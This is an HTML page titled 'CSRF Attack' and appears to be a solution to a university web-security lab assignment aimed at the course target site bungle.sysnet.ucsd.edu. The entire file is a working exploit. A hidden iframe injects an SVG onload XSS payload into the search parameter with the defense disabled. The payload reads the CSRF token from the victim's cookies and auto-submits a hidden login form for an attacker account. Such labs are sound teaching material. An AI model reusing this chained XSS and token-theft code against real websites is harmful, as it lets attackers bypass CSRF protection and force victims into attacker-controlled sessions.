<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>

    <iframe style="display:none" src=""></iframe>

    <script>
        // 1. Define the Malicious Payload (The XSS)
        // This code runs INSIDE bungle.sysnet.ucsd.edu
        const xssPayload = `
            <svg/onload="
                // A. Steal the CSRF token from the victim's cookies
                var token = document.cookie.match(/csrf_token=([a-zA-Z0-9]+)/)[1];

                // B. Create a hidden form pointing to the login page
                var form = document.createElement('form');
                form.action = './login?csrfdefense=1&xssdefense=0';
                form.method = 'POST';

                // C. Add the required fields
                var inputs = {
                    'username': 'attacker',
                    'password': 'l33th4x',
                    'csrf_token': token
                };

                for (var key in inputs) {
                    var input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = inputs[key];
                    form.appendChild(input);
                }

                // D. Append and Submit instantly
                document.body.appendChild(form);
                form.submit();
            ">
        `;

        // 2. Construct the Target URL
        // We inject the payload into the 'q' parameter of the search page.
        // We use xssdefense=0 to ensure the SVG tag isn't sanitized.
        const target = "https://bungle.sysnet.ucsd.edu/search?xssdefense=0&q=" + encodeURIComponent(xssPayload);

        // 3. Launch the Attack
        // Set the iframe source to trigger the XSS
        document.querySelector('iframe').src = target;
    </script>

</body>
</html>
